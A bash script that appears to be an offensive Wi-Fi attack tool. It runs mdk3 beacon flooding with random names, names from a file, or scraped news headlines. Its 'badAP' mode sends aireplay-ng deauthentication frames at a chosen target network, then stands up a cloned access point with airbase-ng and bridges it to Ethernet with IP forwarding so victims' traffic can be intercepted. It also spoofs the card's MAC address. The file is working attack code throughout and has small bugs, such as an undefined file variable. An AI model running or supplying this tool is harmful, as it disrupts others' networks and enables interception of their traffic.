#!/bin/bash

function setcard() {
	sudo airmon-ng start $interface
	#mon=$(echo `sudo airmon-ng`|grep "phy" |cut -d ' ' -f6)
	mon=$(sudo airmon-ng start wlan0mon|grep "mac80211" |cut -d ']' -f2|cut -d " " -f1)
	echo -e "\n[*] You can use 'sudo airmon-ng stop $mon' to stop."
	
	echo -e "[*] You can use (Need stop the airmon-ng.)\n'sudo ifconfig $interface down && sudo macchanger -p \
$interface && sudo ifconfig $interface up'\n[*] to correct mac address.(Need stop the airmon-ng.)"
	if [ $option == newsAP -o $option == newsap ]; then
        echo "[+] Running now(Ctrl+C to stop)..."
        sudo mdk3 $mon b -a -f code/news.txt -s 200
    elif [ $option == diyAP -o $option == diyap ]; then
        echo "Not FINISH!"
        echo "[+] Running now(Ctrl+C to stop)..."
        sudo mdk3 $mon b -a -f $filename -s 200
    elif [ $option == random ]; then
        echo "[+] Running now(Ctrl+C to stop)..."
        sudo mdk3 $mon b -a -s 200
    elif [ $option == badAP -o $option == badap ]; then
	    echo "[!] Need to know the target MAC Address,SSID and Channel."
	    read -p '[&] Enter the target BSSID: ' tb
	    read -p '[&] Enter the target SSID: ' ts
	    read -p '[&] Enter the target Channel: ' tc
		ethset

		sudo iwconfig $mon channel $tc
		read -p '[!] Start deauthentication attack? [Y/N] ' qsend
	    if [ $qsend == "Y" -o $qsend == "y"  ]; then
	        sudo aireplay-ng -0 5 -a $tb --ignore-negative-one $mon
	    else
	        echo "[+] Don't send."
        fi

		sudo airbase-ng -a $tb --essid "$ts" -c $tc $mon&
		netbridge
	fi
}

function netbridge() {

	sudo brctl addbr Wifi-Bridge
	sudo brctl addif Wifi-Bridge $ethName
	sudo brctl addif Wifi-Bridge at0
	sudo ifconfig $ethName 0.0.0.0 up
	sudo ifconfig at0 0.0.0.0 up
	sudo echo 1 > /proc/sys/net/ipv4/ip_forward
	sudo ifconfig Wifi-Bridge up
	echo "[!] Please chaeck if there is any error message(Existing information can be ignored)."
	echo "[+] Running now...(Use 'Ctrl+C' to stop the airbase-ng.)"
	
}

function ethset() {
	read -p "[!] Select the Ethernet interface(default: eth0) to use?[Y/N]" ethChange
	ethName="$eth0"
	if [ $ethChange == "Y" -o $ethChange == "y"  ]; then
		sudo ifconfig
		read -p "[!] Select the Ethernet interface: " ethUse
		ethCheck=$(sudo ifconfig $ethUse)
		ethName="$ethUse"
		echo "[+] Use interface: $ethUse"
		
	fi
}

echo "[+] List:"
sudo iwconfig
read -p "[&] Please select interface : " interface
check=$(sudo iwconfig $interface)
#echo $check
if [ ! -n "$check" ]; then

	echo "[-] This interface no wireless extensions."

else
    mcheck=$(sudo iwconfig $interface|grep "Mode:" |cut -d ':' -f2|cut -d ' ' -f1)
    read -p '[&] Choose an option[random,newsAP,diyAP,badAP]: ' option

    if [ $option == newsAP -o $option == newsap ]; then
		
		echo "[=] Option : newsAP"
		echo "[+] Please wait..."
		IP="news.sina.com.cn"
		testNet=`ping -c 2 $IP | grep "100% packet loss" | wc -l`
		if [ "${testNet}" != 0 ];then
			echo "[-] It seems like can't connect to 'news.sina.com.cn'."
			exit 1
		else
			sudo python code/getnews.py
		fi
	elif [ $option == diyAP -o $option == diyap ]; then
		echo "Not FINISH!"
		#diy file.
	elif [ $option == random ]; then
		echo "[=] Option : random"
	elif [ $option == badAP -o $option == badap ]; then
		echo "[=] Option : badAP"
	else
		echo " [-] Unknown option: $option"
		exit 1
    fi

    read -p '[!] Change the mac address? [Y/N] ' key
    if [ $key == "Y" -o $key == "y"  ]; then
        sudo ifconfig $interface down
	    sudo macchanger -A $interface
	    sudo ifconfig $interface up
        
    else
        echo -e "\n[-] Don't Change the mac address."
	fi
		
	if [ "${mcheck}" == "Monitor" ]; then
		read -p "[!] Skip settings ?[Y/N]" skipset
        if [ $skipset == "Y" -o $skipset == "y" ]; then
		 	if [ $option == newsAP -o $option == newsap ]; then
		 	 	 echo "[+] Running now(Ctrl+C to stop)..."
                 sudo mdk3 $interface b -a -f code/news.txt -s 200
			elif [ $option == diyAP -o $option == diyap ]; then
		 	 	 echo "Not FINISH!"
		 	 	 echo "[+] Running now(Ctrl+C to stop)..."
                 sudo mdk3 $interface b -a -f $filename -s 200
			elif [ $option == random ]; then
		 	 	 echo "[+] Running now(Ctrl+C to stop)..."
                 sudo mdk3 $interface b -a -s 200
			elif [ $option == badAP -o $option == badap ]; then
			 	 echo "[!] Need to know the target MAC Address,SSID and Channel."
		 	 	 read -p '[&] Enter the target BSSID: ' tb
		 	 	 read -p '[&] Enter the target ESSID: ' ts
		 	 	 read -p '[&] Enter the target Channel: ' tc
				 ethset
				 sudo iwconfig $interface channel $tc
				 read -p '[!] Start deauthentication attack? [Y/N] ' qsend
		 		if [ $qsend == "Y" -o $qsend == "y"  ]; then
		 	  	 	 sudo aireplay-ng -0 5 -a $tb --ignore-negative-one $interface
		 		else
		 	 	 	 echo "[+] Don't send."
				fi

				
				sudo airbase-ng -a $tb --essid "$ts" -c $tc $interface&
				netbridge
            fi
        else
			echo -e "\n[-] Don't skip."
			setcard
		fi
    else 
		setcard
    fi
    
fi